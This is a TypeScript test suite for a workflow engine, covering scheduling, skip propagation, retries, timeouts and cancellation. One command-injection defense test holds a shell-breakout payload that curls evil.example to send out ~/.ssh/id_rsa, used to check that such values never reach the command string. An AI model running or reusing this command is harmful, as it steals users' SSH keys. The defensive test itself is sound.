import type { Clock, CommandStep, StepKind, WorkflowDefinition } from '@overture/core'
import { describe, expect, it } from 'vitest'
import { type StepExecutorFn, WorkflowEngine, type WorkflowEngineEvent } from './engine.js'
import { getBuiltinSoftwareDevelopmentWorkflow } from './providers.js'

function step(overrides: Partial<CommandStep> & { id: string }): CommandStep {
  return { kind: 'command', command: 'noop', ...overrides }
}

/** Dispatches each step to a handler keyed by step id, wired to all four executor kinds
 * (only 'command' steps are used in these tests, but WorkflowExecutionContext requires
 * every kind to be provided). */
function executors(handlers: Record<string, StepExecutorFn>): Record<StepKind, StepExecutorFn> {
  const dispatch: StepExecutorFn = async (workflowStep, state) => {
    const handler = handlers[workflowStep.id]
    if (!handler) throw new Error(`no handler registered for step '${workflowStep.id}'`)
    return handler(workflowStep, state)
  }
  return { agent: dispatch, command: dispatch, action: dispatch, approval: dispatch }
}

const ok =
  (outputs: Record<string, unknown> = {}): StepExecutorFn =>
  async () => ({ status: 'succeeded', outputs })

const fail =
  (error = 'boom'): StepExecutorFn =>
  async () => ({ status: 'failed', error })

describe('WorkflowEngine scheduling', () => {
  it('runs a diamond dependency graph, joining before the final step', async () => {
    const order: string[] = []
    const def: WorkflowDefinition = {
      name: 'diamond',
      steps: [
        step({ id: 'a' }),
        step({ id: 'b', dependsOn: ['a'] }),
        step({ id: 'c', dependsOn: ['a'] }),
        step({ id: 'd', dependsOn: ['b', 'c'] }),
      ],
      transitions: { success: 'Done', failure: 'Failed' },
    }
    const record =
      (id: string): StepExecutorFn =>
      async () => {
        order.push(id)
        return { status: 'succeeded' }
      }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({ a: record('a'), b: record('b'), c: record('c'), d: record('d') }),
    })
    expect(result.status).toBe('succeeded')
    expect(order[0]).toBe('a')
    expect(order[3]).toBe('d')
    expect(new Set(order.slice(1, 3))).toEqual(new Set(['b', 'c']))
    expect(result.transition).toBe('success')
    expect(result.transitionTarget).toBe('Done')
  })

  it('respects the concurrency cap', async () => {
    let active = 0
    let peak = 0
    const releases: Array<() => void> = []
    const handler: StepExecutorFn = async () => {
      active++
      peak = Math.max(peak, active)
      await new Promise<void>((resolve) => releases.push(resolve))
      active--
      return { status: 'succeeded' }
    }
    const def: WorkflowDefinition = {
      name: 'fanout',
      steps: ['a', 'b', 'c', 'd'].map((id) => step({ id })),
    }
    const engine = new WorkflowEngine()
    const resultPromise = engine.execute(def, {
      executors: executors({ a: handler, b: handler, c: handler, d: handler }),
      concurrency: 2,
    })

    const releaseNext = async () => {
      await new Promise((resolve) => setTimeout(resolve, 15))
      for (const release of releases.splice(0, releases.length)) release()
    }
    await releaseNext()
    await releaseNext()

    const result = await resultPromise
    expect(peak).toBe(2)
    expect(result.status).toBe('succeeded')
  })

  it('emits step.started and step.completed events in order', async () => {
    const events: WorkflowEngineEvent[] = []
    const def: WorkflowDefinition = { name: 'events', steps: [step({ id: 'a' })] }
    const engine = new WorkflowEngine()
    await engine.execute(def, {
      executors: executors({ a: ok({ x: 1 }) }),
      onEvent: (e) => events.push(e),
    })
    expect(events).toEqual([
      { type: 'step.started', stepId: 'a' },
      { type: 'step.completed', stepId: 'a', status: 'succeeded' },
    ])
  })

  it('resolves ${{ }} placeholders in step fields before invoking the executor', async () => {
    // Command steps interpolate ${{ }} via env-var indirection, not text
    // substitution (see the class doc comment / expressions.ts interpolateForShell)
    // — a command-injection defense (finding CMD-INJ-1). The generated var
    // references land in the command text; the actual values travel via env.
    const def: WorkflowDefinition = {
      name: 'interpolated',
      variables: { test_command: 'npm test' },
      steps: [
        step({ id: 'analyze' }),
        step({
          id: 'run',
          dependsOn: ['analyze'],
          command: '${{ vars.test_command }} -- ${{ steps.analyze.outputs.suite }}',
        }),
      ],
    }
    let receivedCommand: string | undefined
    let receivedEnv: Readonly<Record<string, string>> | undefined
    const engine = new WorkflowEngine()
    await engine.execute(def, {
      executors: executors({
        analyze: ok({ suite: 'unit' }),
        run: async (workflowStep) => {
          if (workflowStep.kind === 'command') {
            receivedCommand = workflowStep.command
            receivedEnv = workflowStep.env
          }
          return { status: 'succeeded' }
        },
      }),
    })
    expect(receivedCommand).toBe('"$OVERTURE_VAR_0" -- "$OVERTURE_VAR_1"')
    expect(receivedEnv).toEqual({ OVERTURE_VAR_0: 'npm test', OVERTURE_VAR_1: 'unit' })
  })

  it('does NOT interpolate command steps via direct text substitution — a malicious value never appears in the command string', async () => {
    const payload = '"; curl evil.example/$(cat ~/.ssh/id_rsa); echo "'
    const def: WorkflowDefinition = {
      name: 'command-injection-defense',
      variables: { work_title: payload },
      steps: [step({ id: 'run', command: 'echo "${{ vars.work_title }}"' })],
    }
    let receivedCommand: string | undefined
    let receivedEnv: Readonly<Record<string, string>> | undefined
    const engine = new WorkflowEngine()
    await engine.execute(def, {
      executors: executors({
        run: async (workflowStep) => {
          if (workflowStep.kind === 'command') {
            receivedCommand = workflowStep.command
            receivedEnv = workflowStep.env
          }
          return { status: 'succeeded' }
        },
      }),
    })
    expect(receivedCommand).not.toContain(payload)
    expect(receivedCommand).not.toContain('curl')
    expect(receivedEnv?.OVERTURE_VAR_0).toBe(payload)
  })

  it('interpolates action `with` values and agent `goal` directly (they never hit a shell)', async () => {
    const def: WorkflowDefinition = {
      name: 'non-shell-interpolation',
      variables: { title: 'a "quoted" & `tricky` value' },
      steps: [
        {
          id: 'deliver',
          kind: 'action',
          action: 'source_control.pull_request',
          with: { title: '${{ vars.title }}' },
        },
      ],
    }
    let receivedTitle: unknown
    const engine = new WorkflowEngine()
    await engine.execute(def, {
      executors: executors({
        deliver: async (workflowStep) => {
          if (workflowStep.kind === 'action') receivedTitle = workflowStep.with?.title
          return { status: 'succeeded' }
        },
      }),
    })
    expect(receivedTitle).toBe('a "quoted" & `tricky` value')
  })

  it('uses the supplied clock for step start/finish timestamps', async () => {
    let nowMs = new Date('2026-01-01T00:00:00.000Z').getTime()
    const clock: Clock = {
      now: () => {
        nowMs += 1000
        return new Date(nowMs)
      },
    }
    const def: WorkflowDefinition = { name: 'clocked', steps: [step({ id: 'a' })] }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, { executors: executors({ a: ok() }), clock })
    const a = result.stepResults.get('a')
    expect(a?.startedAt?.toISOString()).toBe('2026-01-01T00:00:01.000Z')
    expect(a?.finishedAt?.toISOString()).toBe('2026-01-01T00:00:02.000Z')
  })
})

describe('WorkflowEngine eligibility and skip propagation', () => {
  it('runs a remediation step whose `when` targets a failed dependency, and skips it when the dependency succeeded', async () => {
    async function run(reviewOutcome: 'succeeded' | 'failed') {
      const def: WorkflowDefinition = {
        name: 'remediation',
        steps: [
          step({ id: 'review' }),
          step({ id: 'remediate', dependsOn: ['review'], when: 'steps.review.failed' }),
          // no `when`: default rule requires remediate to have succeeded
          step({ id: 'deliver', dependsOn: ['remediate'] }),
        ],
      }
      const remediateCalls: string[] = []
      const engine = new WorkflowEngine()
      const result = await engine.execute(def, {
        executors: executors({
          review: async () => ({ status: reviewOutcome }),
          remediate: async () => {
            remediateCalls.push('ran')
            return { status: 'succeeded' }
          },
          deliver: ok(),
        }),
      })
      return { result, remediateCalls }
    }

    const failing = await run('failed')
    expect(failing.remediateCalls).toEqual(['ran'])
    expect(failing.result.stepResults.get('remediate')?.status).toBe('succeeded')
    expect(failing.result.stepResults.get('deliver')?.status).toBe('succeeded')
    expect(failing.result.status).toBe('succeeded')

    const passing = await run('succeeded')
    expect(passing.remediateCalls).toEqual([])
    expect(passing.result.stepResults.get('remediate')?.status).toBe('skipped')
    // deliver's default rule needs remediate 'succeeded'; it was 'skipped', so deliver skips too.
    expect(passing.result.stepResults.get('deliver')?.status).toBe('skipped')
    // remediate's skip was `when`-caused (benign — nothing failed, remediation just
    // wasn't needed), so deliver's cascaded skip is benign too: overall success.
    expect(passing.result.status).toBe('succeeded')
  })

  it('propagates a failed dependency through no-when steps as a TAINTED skip, failing the workflow', async () => {
    // Linear A -> B -> C, no `when` anywhere. B's skip is caused by A's real failure,
    // so B is a tainted skip; C's skip is caused by B's taint, so C is tainted too.
    // C is the terminal step, so the whole workflow is reported as failed.
    const def: WorkflowDefinition = {
      name: 'chain',
      steps: [
        step({ id: 'a' }),
        step({ id: 'b', dependsOn: ['a'] }),
        step({ id: 'c', dependsOn: ['b'] }),
      ],
      transitions: { failure: 'Agent Failed' },
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({ a: fail('a broke'), b: ok(), c: ok() }),
    })
    expect(result.stepResults.get('a')?.status).toBe('failed')
    expect(result.stepResults.get('b')?.status).toBe('skipped')
    expect(result.stepResults.get('b')?.error).toMatch(/dependency 'a' did not succeed/)
    expect(result.stepResults.get('c')?.status).toBe('skipped')
    expect(result.status).toBe('failed')
    expect(result.transition).toBe('failure')
    expect(result.transitionTarget).toBe('Agent Failed')
  })

  it('does not taint a skip caused purely by a benign `when`-false evaluation, even for a terminal step', async () => {
    // Nothing failed here — 'gated' just wasn't needed, per its own `when`. Since it's
    // the terminal step, this proves a when-false skip alone can never fail a workflow.
    const def: WorkflowDefinition = {
      name: 'benign-gate',
      variables: { flag: 'no' },
      steps: [step({ id: 'gated', when: "vars.flag == 'yes'" })],
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, { executors: executors({ gated: ok() }) })
    expect(result.stepResults.get('gated')?.status).toBe('skipped')
    expect(result.status).toBe('succeeded')
  })

  it('lets a when-gated remediation step turn a failure into overall success once it succeeds', async () => {
    // review fails -> remediate runs (when: steps.review.failed) and succeeds ->
    // deliver is gated by `when: steps.review.succeeded || steps.remediate.succeeded`,
    // which is now true, so deliver runs (for real, not a skip) and succeeds.
    const def: WorkflowDefinition = {
      name: 'remediation-disjunction',
      steps: [
        step({ id: 'review' }),
        step({ id: 'remediate', dependsOn: ['review'], when: 'steps.review.failed' }),
        step({
          id: 'deliver',
          dependsOn: ['review', 'remediate'],
          when: 'steps.review.succeeded || steps.remediate.succeeded',
        }),
      ],
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({ review: fail('needs fixes'), remediate: ok(), deliver: ok() }),
    })
    expect(result.stepResults.get('review')?.status).toBe('failed')
    expect(result.stepResults.get('remediate')?.status).toBe('succeeded')
    expect(result.stepResults.get('deliver')?.status).toBe('succeeded')
    expect(result.status).toBe('succeeded')
  })

  it('fails the workflow when a terminal step itself fails', async () => {
    const def: WorkflowDefinition = {
      name: 'single',
      steps: [step({ id: 'only' })],
      transitions: { failure: 'Agent Failed' },
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, { executors: executors({ only: fail('boom') }) })
    expect(result.status).toBe('failed')
    expect(result.transition).toBe('failure')
    expect(result.transitionTarget).toBe('Agent Failed')
  })

  it('continueOnFailure lets a failed dependency`s default-rule dependents proceed', async () => {
    const def: WorkflowDefinition = {
      name: 'continue',
      steps: [step({ id: 'a', continueOnFailure: true }), step({ id: 'b', dependsOn: ['a'] })],
    }
    const calls: string[] = []
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({
        a: fail('a broke'),
        b: async () => {
          calls.push('b ran')
          return { status: 'succeeded' }
        },
      }),
    })
    expect(result.stepResults.get('a')?.status).toBe('failed')
    expect(calls).toEqual(['b ran'])
    expect(result.stepResults.get('b')?.status).toBe('succeeded')
    expect(result.status).toBe('succeeded')
  })

  it('continueOnFailure on a terminal step keeps the workflow succeeded', async () => {
    const def: WorkflowDefinition = {
      name: 'terminal-continue',
      steps: [step({ id: 'only', continueOnFailure: true })],
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, { executors: executors({ only: fail('boom') }) })
    expect(result.status).toBe('succeeded')
  })

  it('skips a step whose when evaluates false, recording the reason', async () => {
    const def: WorkflowDefinition = {
      name: 'gate',
      variables: { flag: 'no' },
      steps: [step({ id: 'gated', when: "vars.flag == 'yes'" })],
    }
    const events: WorkflowEngineEvent[] = []
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({ gated: ok() }),
      onEvent: (e) => events.push(e),
    })
    expect(result.stepResults.get('gated')?.status).toBe('skipped')
    expect(result.stepResults.get('gated')?.error).toMatch(/evaluated to false/)
    expect(events).toContainEqual({
      type: 'step.skipped',
      stepId: 'gated',
      reason: expect.stringMatching(/evaluated to false/),
    })
  })
})

describe('WorkflowEngine retries and timeouts', () => {
  it('retries a failing step up to max_attempts, succeeding on a later attempt', async () => {
    let attempts = 0
    const def: WorkflowDefinition = {
      name: 'retry',
      steps: [step({ id: 'flaky', retry: { maxAttempts: 3, backoffMs: 5 } })],
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({
        flaky: async (_s, state) => {
          attempts++
          expect(state.attempt).toBe(attempts)
          if (attempts < 3) return { status: 'failed', error: `attempt ${attempts} failed` }
          return { status: 'succeeded' }
        },
      }),
    })
    expect(attempts).toBe(3)
    expect(result.stepResults.get('flaky')?.status).toBe('succeeded')
  })

  it('gives up after max_attempts, recording the last error', async () => {
    let attempts = 0
    const def: WorkflowDefinition = {
      name: 'retry-exhausted',
      steps: [step({ id: 'flaky', retry: { maxAttempts: 2, backoffMs: 5 } })],
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({
        flaky: async () => {
          attempts++
          return { status: 'failed', error: `attempt ${attempts}` }
        },
      }),
    })
    expect(attempts).toBe(2)
    expect(result.stepResults.get('flaky')).toMatchObject({ status: 'failed', error: 'attempt 2' })
  })

  it('treats a thrown error the same as a failed result for retry purposes', async () => {
    let attempts = 0
    const def: WorkflowDefinition = {
      name: 'throwing',
      steps: [step({ id: 'flaky', retry: { maxAttempts: 2, backoffMs: 5 } })],
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({
        flaky: async () => {
          attempts++
          if (attempts === 1) throw new Error('kaboom')
          return { status: 'succeeded' }
        },
      }),
    })
    expect(attempts).toBe(2)
    expect(result.stepResults.get('flaky')?.status).toBe('succeeded')
  })

  it('does not retry when no retry policy is configured', async () => {
    let attempts = 0
    const def: WorkflowDefinition = { name: 'no-retry', steps: [step({ id: 'a' })] }
    const engine = new WorkflowEngine()
    await engine.execute(def, {
      executors: executors({
        a: async () => {
          attempts++
          return { status: 'failed' }
        },
      }),
    })
    expect(attempts).toBe(1)
  })

  it('fails a step that exceeds its timeout, even if the executor never settles', async () => {
    const def: WorkflowDefinition = {
      name: 'timeout',
      steps: [step({ id: 'slow', timeoutMs: 20 })],
    }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({ slow: () => new Promise(() => {}) }),
    })
    expect(result.stepResults.get('slow')?.status).toBe('failed')
    expect(result.stepResults.get('slow')?.error).toMatch(/timed out after 20ms/)
    expect(result.status).toBe('failed')
  })

  it('passes an abortable signal into the executor on timeout', async () => {
    const def: WorkflowDefinition = {
      name: 'abortable',
      steps: [step({ id: 'slow', timeoutMs: 20 })],
    }
    let observedAborted = false
    const engine = new WorkflowEngine()
    await engine.execute(def, {
      executors: executors({
        slow: (_s, state) =>
          new Promise((resolve) => {
            state.signal.addEventListener('abort', () => {
              observedAborted = true
              resolve({ status: 'failed', error: 'aborted' })
            })
          }),
      }),
    })
    expect(observedAborted).toBe(true)
  })
})

describe('WorkflowEngine cancellation', () => {
  it('stops launching new steps and marks unstarted ones skipped', async () => {
    const controller = new AbortController()
    const def: WorkflowDefinition = {
      name: 'cancel',
      steps: [step({ id: 'a' }), step({ id: 'b', dependsOn: ['a'] })],
      transitions: { blocked: 'Needs Attention' },
    }
    const engine = new WorkflowEngine()
    const resultPromise = engine.execute(def, {
      executors: executors({
        a: (_s, state) =>
          new Promise((resolve) => {
            state.signal.addEventListener('abort', () =>
              resolve({ status: 'failed', error: 'cancelled' }),
            )
          }),
        b: ok(),
      }),
      signal: controller.signal,
    })
    await new Promise((resolve) => setTimeout(resolve, 10))
    controller.abort()
    const result = await resultPromise
    expect(result.status).toBe('cancelled')
    expect(result.stepResults.get('a')?.status).toBe('failed')
    expect(result.stepResults.get('b')?.status).toBe('skipped')
    expect(result.stepResults.get('b')?.error).toMatch(/workflow cancelled/)
    expect(result.transition).toBe('blocked')
    expect(result.transitionTarget).toBe('Needs Attention')
  })

  it('is cancelled immediately if the signal is already aborted', async () => {
    const controller = new AbortController()
    controller.abort()
    const def: WorkflowDefinition = { name: 'pre-aborted', steps: [step({ id: 'a' })] }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, {
      executors: executors({ a: ok() }),
      signal: controller.signal,
    })
    expect(result.status).toBe('cancelled')
    expect(result.stepResults.get('a')?.status).toBe('skipped')
  })
})

describe('WorkflowEngine transitions', () => {
  it('omits transitionTarget when transitions are not configured', async () => {
    const def: WorkflowDefinition = { name: 'no-transitions', steps: [step({ id: 'a' })] }
    const engine = new WorkflowEngine()
    const result = await engine.execute(def, { executors: executors({ a: ok() }) })
    expect(result.transition).toBe('success')
    expect('transitionTarget' in result).toBe(false)
  })
})

describe('WorkflowEngine running the built-in software-development workflow', () => {
  // ensure_validated is `action: workflow.assert`, `when: 'true'` (always eligible)
  // precisely so its own real success/failure — not a benign `when`-skip — is what
  // carries a genuine "nothing worked" outcome. This scripted executor mirrors the
  // real `workflow.assert` action (packages/orchestrator/src/actions.ts): fail unless
  // the (already-interpolated, by the engine) `with.condition` is the string 'true'.
  function assertExecutor(): StepExecutorFn {
    return async (step) => {
      const condition = step.kind === 'action' ? step.with?.condition : undefined
      if (condition === 'true') return { status: 'succeeded' }
      const message =
        step.kind === 'action' && typeof step.with?.message === 'string'
          ? step.with.message
          : 'assertion failed'
      return { status: 'failed', error: message }
    }
  }

  it('reports overall success when review passes on the first attempt', async () => {
    const definition = getBuiltinSoftwareDevelopmentWorkflow()
    const engine = new WorkflowEngine()
    const result = await engine.execute(definition, {
      executors: executors({
        analyze: ok({ title: 'Fix the bug', plan: 'do it' }),
        implement: ok(),
        test: ok(),
        review: ok(),
        ensure_validated: assertExecutor(),
        deliver: ok(),
      }),
    })
    expect(result.stepResults.get('remediate')?.status).toBe('skipped')
    expect(result.stepResults.get('re_review')?.status).toBe('skipped')
    expect(result.stepResults.get('ensure_validated')?.status).toBe('succeeded')
    expect(result.stepResults.get('deliver')?.status).toBe('succeeded')
    expect(result.status).toBe('succeeded')
    expect(result.transition).toBe('success')
    expect(result.transitionTarget).toBe('Done')
  })

  it('reports overall success when review fails but remediation fixes it', async () => {
    const definition = getBuiltinSoftwareDevelopmentWorkflow()
    const engine = new WorkflowEngine()
    const result = await engine.execute(definition, {
      executors: executors({
        analyze: ok({ title: 'Fix the bug', plan: 'do it' }),
        implement: ok(),
        test: ok(),
        review: fail('found issues'),
        remediate: ok(),
        re_review: ok(),
        ensure_validated: assertExecutor(),
        deliver: ok(),
      }),
    })
    expect(result.stepResults.get('review')?.status).toBe('failed')
    expect(result.stepResults.get('remediate')?.status).toBe('succeeded')
    expect(result.stepResults.get('re_review')?.status).toBe('succeeded')
    expect(result.stepResults.get('ensure_validated')?.status).toBe('succeeded')
    expect(result.stepResults.get('deliver')?.status).toBe('succeeded')
    expect(result.status).toBe('succeeded')
  })

  it('reports overall failure when review fails and remediation does not fix it', async () => {
    const definition = getBuiltinSoftwareDevelopmentWorkflow()
    const engine = new WorkflowEngine()
    const result = await engine.execute(definition, {
      executors: executors({
        analyze: ok({ title: 'Fix the bug', plan: 'do it' }),
        implement: ok(),
        test: ok(),
        review: fail('found issues'),
        remediate: fail('could not fix it'),
        ensure_validated: assertExecutor(),
        deliver: ok(),
      }),
    })
    expect(result.stepResults.get('review')?.status).toBe('failed')
    expect(result.stepResults.get('remediate')?.status).toBe('failed')
    // re_review's `when` (steps.remediate.succeeded) is false: a benign skip.
    expect(result.stepResults.get('re_review')?.status).toBe('skipped')
    // ensure_validated always runs (when: 'true') and its assert genuinely fails here
    // (condition interpolates to 'false') — a real failure, not a skip, so it taints
    // deliver's default-rule dependency on it.
    expect(result.stepResults.get('ensure_validated')).toMatchObject({
      status: 'failed',
      error: 'neither review nor re-review succeeded',
    })
    expect(result.stepResults.get('deliver')?.status).toBe('skipped')
    expect(result.status).toBe('failed')
    expect(result.transition).toBe('failure')
    expect(result.transitionTarget).toBe('Agent Failed')
  })

  it('still fails the workflow when an early step (implement) fails, before review even runs', async () => {
    const definition = getBuiltinSoftwareDevelopmentWorkflow()
    const engine = new WorkflowEngine()
    const result = await engine.execute(definition, {
      executors: executors({
        analyze: ok({ title: 'Fix the bug', plan: 'do it' }),
        implement: fail('could not implement the plan'),
        test: ok(),
        review: ok(),
        ensure_validated: assertExecutor(),
        deliver: ok(),
      }),
    })
    expect(result.stepResults.get('implement')?.status).toBe('failed')
    expect(result.stepResults.get('test')?.status).toBe('skipped')
    expect(result.stepResults.get('review')?.status).toBe('skipped')
    // remediate/re_review are `when`-gated on review's *status*; review itself never
    // ran (it was skipped, not failed), so their `when` is false too — benign skips.
    expect(result.stepResults.get('remediate')?.status).toBe('skipped')
    expect(result.stepResults.get('re_review')?.status).toBe('skipped')
    // ensure_validated is `when: 'true'`, so it runs for real regardless of what
    // happened upstream (depends_on only gates ordering here). Its condition
    // (`steps.review.succeeded || steps.re_review.succeeded`) interpolates to
    // 'false' — review and re_review are both 'skipped', neither 'succeeded' — so
    // the assert genuinely fails: a real failure, not a skip.
    expect(result.stepResults.get('ensure_validated')).toMatchObject({
      status: 'failed',
      error: 'neither review nor re-review succeeded',
    })
    // deliver's plain depends_on: [ensure_validated] sees a real (non-forgiven)
    // failure, so it's a tainted skip, and it's the terminal step.
    expect(result.stepResults.get('deliver')?.status).toBe('skipped')
    expect(result.status).toBe('failed')
    expect(result.transition).toBe('failure')
    expect(result.transitionTarget).toBe('Agent Failed')
  })
})
